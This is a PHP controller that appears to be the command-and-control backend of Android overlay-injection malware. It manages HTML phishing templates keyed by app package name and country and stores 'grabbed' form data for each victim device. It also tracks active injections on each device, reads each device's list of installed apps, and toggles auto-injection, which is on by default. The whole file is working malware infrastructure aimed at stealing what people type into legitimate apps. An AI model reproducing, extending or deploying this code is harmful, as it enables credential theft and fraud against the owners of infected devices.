<?php
namespace app\controller;

use app\BaseController;
use think\facade\Db;
use think\facade\Request;

class InjectionController extends BaseController
{
    /**
     * GET /api/injection/templates
     * 获取注入模板列表
     */
    public function listTemplates()
    {
        // 列表不返回 html_content（数据量太大），前端注入时通过 /api/injection/templates/:id 单独获取
        $rows = Db::table('fisher_injection_templates')
            ->field('template_id, name, package_name, country, icon, color, file, type, enabled, visible, created_at, updated_at')
            ->order('id', 'asc')
            ->select()->toArray();

        $templates = [];
        foreach ($rows as $r) {
            $templates[] = [
                'id'          => $r['template_id'],
                'templateId'  => $r['template_id'],
                'name'        => $r['name'],
                'packageName' => $r['package_name'] ?? '',
                'country'     => $r['country'] ?? '',
                'icon'        => $r['icon'] ?? '',
                'color'       => $r['color'] ?? '',
                'file'        => $r['file'] ?? '',
                'type'        => $r['type'] ?? '',
                'enabled'     => (bool)($r['enabled'] ?? 0),
                'visible'     => (bool)($r['visible'] ?? 1),
                'created_at'  => $r['created_at'] ?? '',
                'updated_at'  => $r['updated_at'] ?? '',
            ];
        }

        return json(['success' => true, 'templates' => $templates, 'data' => $templates]);
    }

    /**
     * GET /api/injection/template/:id
     * 获取单个模板
     */
    public function getTemplate($id = '', $templateId = '')
    {
        $tplId = $templateId ?: $id;
        $r = Db::table('fisher_injection_templates')->where('template_id', $tplId)->find();
        // 如果按 template_id 找不到，尝试按 package_name 查找
        if (!$r) {
            $r = Db::table('fisher_injection_templates')->where('package_name', $tplId)->find();
        }
        if (!$r) {
            return json(['success' => false, 'message' => 'Template not found'], 404);
        }
        $template = [
            'id'          => $r['template_id'],
            'templateId'  => $r['template_id'],
            'name'        => $r['name'],
            'packageName' => $r['package_name'] ?? '',
            'country'     => $r['country'] ?? '',
            'icon'        => $r['icon'] ?? '',
            'color'       => $r['color'] ?? '',
            'file'        => $r['file'] ?? '',
            'type'        => $r['type'] ?? '',
            'htmlContent' => $r['html_content'] ?? '',
            'enabled'     => (bool)($r['enabled'] ?? 0),
            'visible'     => (bool)($r['visible'] ?? 1),
        ];
        return json(['success' => true, 'data' => $template, 'message' => 'success']);
    }

    /**
     * POST /api/injection/template
     * 添加模板
     */
    public function addTemplate()
    {
        $data = Request::post();
        $templateId = $data['templateId'] ?? $data['template_id'] ?? uniqid('tpl-');

        Db::table('fisher_injection_templates')->insert([
            'template_id'  => $templateId,
            'name'         => $data['name'] ?? '',
            'package_name' => $data['packageName'] ?? '',
            'country'      => $data['country'] ?? '',
            'icon'         => $data['icon'] ?? '',
            'color'        => $data['color'] ?? '',
            'file'         => $data['file'] ?? '',
            'type'         => $data['type'] ?? '',
            'html_content' => $data['htmlContent'] ?? '',
            'enabled'      => isset($data['enabled']) ? ($data['enabled'] ? 1 : 0) : 1,
            'visible'      => isset($data['visible']) ? ($data['visible'] ? 1 : 0) : 1,
            'created_at'   => date('Y-m-d H:i:s'),
            'updated_at'   => date('Y-m-d H:i:s'),
        ]);

        return json(['success' => true, 'data' => ['templateId' => $templateId], 'message' => 'success']);
    }

    /**
     * PUT /api/injection/template/:id
     * 更新模板
     */
    public function updateTemplate($id = '', $templateId = '')
    {
        $id = $templateId ?: $id;
        // PUT JSON body 可能需要手动解析
        $raw = file_get_contents('php://input');
        $data = $raw ? json_decode($raw, true) : [];
        if (!$data) $data = Request::param();
        $updates = [];

        if (isset($data['name'])) $updates['name'] = $data['name'];
        if (isset($data['packageName'])) $updates['package_name'] = $data['packageName'];
        if (isset($data['country'])) $updates['country'] = $data['country'];
        if (isset($data['icon'])) $updates['icon'] = $data['icon'];
        if (isset($data['color'])) $updates['color'] = $data['color'];
        if (isset($data['file'])) $updates['file'] = $data['file'];
        if (isset($data['type'])) $updates['type'] = $data['type'];
        if (isset($data['htmlContent'])) $updates['html_content'] = $data['htmlContent'];
        if (isset($data['enabled'])) $updates['enabled'] = $data['enabled'] ? 1 : 0;
        if (isset($data['visible'])) $updates['visible'] = $data['visible'] ? 1 : 0;
        $updates['updated_at'] = date('Y-m-d H:i:s');

        if ($updates) {
            // 先按 template_id 查，查不到再按 package_name 查
            $row = Db::table('fisher_injection_templates')->where('template_id', $id)->find();
            if ($row) {
                Db::table('fisher_injection_templates')->where('template_id', $id)->update($updates);
            } else {
                Db::table('fisher_injection_templates')->where('package_name', $id)->update($updates);
            }
        }

        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * DELETE /api/injection/template/:id
     * 删除模板
     */
    public function deleteTemplate($id = '', $templateId = '')
    {
        $id = $templateId ?: $id;
        Db::table('fisher_injection_templates')->where('template_id', $id)->delete();
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * GET /api/injection/configs
     * 获取全局注入配置
     */
    public function listConfigs()
    {
        $rows = Db::table('fisher_injection_templates')->order('id', 'asc')->select()->toArray();

        $configs = [];
        foreach ($rows as $r) {
            $configs[] = [
                'id'          => $r['template_id'],
                'templateId'  => $r['template_id'],
                'name'        => $r['name'],
                'packageName' => $r['package_name'] ?? '',
                'country'     => $r['country'] ?? '',
                'icon'        => $r['icon'] ?? '',
                'color'       => $r['color'] ?? '',
                'enabled'     => (bool)($r['enabled'] ?? 0),
                'visible'     => (bool)($r['visible'] ?? 1),
                'autoInject'  => false,
            ];
        }

        return json(['success' => true, 'configs' => $configs, 'data' => $configs]);
    }

    /**
     * POST /api/injection/config
     * 更新注入配置（启用/禁用/可见性）
     */
    public function updateConfig()
    {
        $data = Request::post();
        $templateId = $data['templateId'] ?? $data['template_id'] ?? '';

        if (!$templateId) {
            return json(['success' => false, 'message' => 'templateId required'], 400);
        }

        if (isset($data['enabled'])) {
            Db::table('fisher_injection_templates')
                ->where('template_id', $templateId)
                ->update(['enabled' => $data['enabled'] ? 1 : 0]);
        }
        if (isset($data['visible'])) {
            Db::table('fisher_injection_templates')
                ->where('template_id', $templateId)
                ->update(['visible' => $data['visible'] ? 1 : 0]);
        }

        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * GET /api/injection/grabbed-data?deviceId=xxx
     * 获取注入抓取的数据
     * Python 路由: /api/injection/data — 返回 ok({"list": result})
     * result 中每项: {id, deviceId, templateName, packageName, data, timestamp}
     */
    public function grabbedData()
    {
        $deviceId = Request::get('deviceId', '');

        if (!$deviceId) {
            return json(['success' => true, 'data' => [], 'message' => 'success']);
        }

        $rows = Db::table('fisher_injection_data')
            ->where('device_id', $deviceId)
            ->order('created_at', 'desc')
            ->select()
            ->toArray();

        $result = [];
        foreach ($rows as $r) {
            // Python: json.loads(d['form_data']) — 兼容 data_json / form_data 字段
            $formData = $r['form_data'] ?? $r['data_json'] ?? '{}';
            try {
                $parsedData = json_decode($formData, true) ?: [];
            } catch (\Exception $e) {
                $parsedData = [];
            }

            $createdAt = $r['created_at'] ?? 0;
            // Python: int(d['created_at'] * 1000) if isinstance(d['created_at'], (int, float))
            $timestamp = is_numeric($createdAt) ? (int)($createdAt * 1000) : $createdAt;

            $result[] = [
                'id'           => $r['id'] ?? 0,
                'deviceId'     => $r['device_id'] ?? '',
                'templateName' => $r['template_name'] ?? $r['app_name'] ?? '',
                'packageName'  => $r['package_name'] ?? $r['data_type'] ?? '',
                'data'         => $parsedData,
                'timestamp'    => $timestamp,
            ];
        }

        return json(['success' => true, 'data' => $result, 'message' => 'success']);
    }

    /**
     * GET /api/injection/active-tasks?deviceId=xxx
     * 获取设备当前活跃的注入任务
     * Python: 基于内存 dict active_injection_tasks[device_id].values()
     * 返回: {"success": true, "data": tasks, "message": "success"}
     * 由于 PHP 无内存状态，从 fisher_active_injection_tasks 表读取（如果有），否则返回空数组
     */
    public function activeTasks()
    {
        // POST: 注册活跃注入任务
        if (Request::isPost()) {
            $data = Request::post();
            $deviceId = $data['deviceId'] ?? '';
            $packageName = $data['packageName'] ?? '';
            $templateId = $data['templateId'] ?? '';
            if ($deviceId && $packageName) {
                try {
                    $taskJson = json_encode(['packageName' => $packageName, 'templateId' => $templateId, 'startedAt' => time()]);
                    // 去重：先删再插
                    Db::table('fisher_active_injection_tasks')
                        ->where('device_id', $deviceId)
                        ->where('package_name', $packageName)
                        ->delete();
                    Db::table('fisher_active_injection_tasks')->insert([
                        'device_id' => $deviceId,
                        'package_name' => $packageName,
                        'task_json' => $taskJson,
                        'created_at' => date('Y-m-d H:i:s'),
                    ]);
                } catch (\Exception $e) {
                    // 表可能不存在，忽略
                }
            }
            return json(['success' => true, 'data' => null, 'message' => 'success']);
        }

        // DELETE: 移除活跃注入任务
        if (Request::isDelete()) {
            $deviceId = Request::get('deviceId', '');
            $packageName = Request::get('packageName', '');
            if ($deviceId && $packageName) {
                try {
                    Db::table('fisher_active_injection_tasks')
                        ->where('device_id', $deviceId)
                        ->where('package_name', $packageName)
                        ->delete();
                } catch (\Exception $e) {}
            }
            return json(['success' => true, 'data' => null, 'message' => 'success']);
        }

        // GET: 查询活跃注入任务
        $deviceId = Request::get('deviceId', '');
        $tasks = [];
        $packages = [];
        $templateIds = [];

        if ($deviceId) {
            try {
                $rows = Db::table('fisher_active_injection_tasks')
                    ->where('device_id', $deviceId)
                    ->select()
                    ->toArray();
                foreach ($rows as $row) {
                    $taskData = json_decode($row['task_json'] ?? '{}', true);
                    if ($taskData) {
                        $tasks[] = $taskData;
                        if (!empty($taskData['packageName'])) $packages[] = $taskData['packageName'];
                        if (!empty($taskData['templateId'])) $templateIds[] = $taskData['templateId'];
                    }
                    // fallback: 直接用 package_name 字段
                    if (empty($taskData['packageName']) && !empty($row['package_name'])) {
                        $packages[] = $row['package_name'];
                    }
                }
            } catch (\Exception $e) {
                $tasks = [];
            }
        }

        return json(['success' => true, 'data' => $tasks, 'packages' => $packages, 'templateIds' => $templateIds, 'message' => 'success']);
    }

    /**
     * GET /api/injection/global-configs
     * 获取注入全局配置
     * Python 返回: jsonify({"success": True, "configs": configs})
     * 注意：无 "data" 和 "message" 字段！
     */
    public function globalConfigs()
    {
        $rows = Db::table('fisher_injection_templates')->order('id', 'asc')->select()->toArray();
        $configs = [];
        foreach ($rows as $r) {
            $configs[] = [
                'id'          => $r['template_id'] ?? '',
                'templateId'  => $r['template_id'] ?? '',
                'htmlContent' => $r['html_content'] ?? '',
                'packageName' => $r['package_name'] ?? '',
                'name'        => $r['name'] ?? '',
                'enabled'     => (bool)($r['enabled'] ?? 0),
                'visible'     => (bool)($r['visible'] ?? 1),
                'autoInject'  => false,
            ];
        }

        // Python: jsonify({"success": True, "configs": configs}) — 无 data/message
        return json(['success' => true, 'configs' => $configs]);
    }

    /**
     * GET /api/device/:id/apps
     * 获取设备已安装应用列表（从 fisher_device_apps 表读取）
     */
    public function deviceApps($id)
    {
        $row = Db::table('fisher_device_apps')->where('device_id', $id)->find();
        if (!$row) {
            return json([
                'success' => true,
                'data' => [
                    'apps' => [],
                    'injection_active' => true,
                    'updated_at' => 0,
                ]
            ]);
        }

        $apps = [];
        if (!empty($row['installed_apps'])) {
            $apps = json_decode($row['installed_apps'], true) ?: [];
        }

        // 默认为 true（自动注入默认开启），只有用户手动关闭时才为 false
        $injActive = isset($row['injection_active']) ? (bool)$row['injection_active'] : true;
        return json([
            'success' => true,
            'data' => [
                'apps' => $apps,
                'injection_active' => $injActive,
                'updated_at' => (int)($row['updated_at'] ?? 0),
            ]
        ]);
    }

    /**
     * PUT /api/device/:id/auto-injection
     * 切换设备自动注入开关
     */
    public function toggleAutoInjection($id)
    {
        $data = Request::put();
        $active = isset($data['active']) ? ($data['active'] ? 1 : 0) : null;

        if ($active === null) {
            return json(['success' => false, 'message' => 'Missing active parameter'], 400);
        }

        // UPSERT
        $row = Db::table('fisher_device_apps')->where('device_id', $id)->find();
        $now = time();
        if ($row) {
            Db::table('fisher_device_apps')->where('device_id', $id)->update([
                'injection_active' => $active,
                'updated_at' => $now,
            ]);
        } else {
            Db::table('fisher_device_apps')->insert([
                'device_id' => $id,
                'injection_active' => $active,
                'installed_apps' => null,
                'updated_at' => $now,
            ]);
        }

        return json([
            'success' => true,
            'data' => ['injection_active' => (bool)$active],
            'message' => $active ? 'Auto injection enabled' : 'Auto injection disabled'
        ]);
    }
}
